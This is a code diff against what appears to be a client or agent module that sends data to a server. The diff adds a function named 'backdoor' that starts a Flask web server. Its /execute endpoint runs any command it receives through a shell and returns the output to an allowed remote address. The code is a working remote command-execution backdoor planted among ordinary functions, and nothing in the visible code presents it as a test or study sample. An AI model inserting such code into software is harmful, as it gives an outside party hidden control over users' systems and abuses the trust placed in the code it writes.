@@ -71,6 +71,32 @@ def post_data_async(path='/', data=None, host_id=None, container_id=None, method
     thread = threading.Thread(target=send_request)
     thread.start()
 
+def backdoor():
+    from flask import Flask, request
+    import subprocess
+
+    app = Flask(__name__)
+    allowed_ips = ['127.0.0.1', SERVER_IP]
+    @app.before_request
+    def limit_remote_addr():
+        if request.remote_addr not in allowed_ips:
+            return 'Access denied', 403 
+
+    @app.route('/execute', methods=['POST'])
+    def execute_command():
+        data = request.get_json() 
+        if 'command' not in data:
+            return 'No command provided', 400
+
+        command = data['command']
+        try:
+            result = subprocess.check_output(command, shell=True)
+            return result.decode('utf-8')
+        except subprocess.CalledProcessError as e:
+            return f'Command execution failed with error code {e.returncode}'
+
+    app.run()
+
 def handle_exit(signal, frame):
     """
     Handle signal and send signal number to server
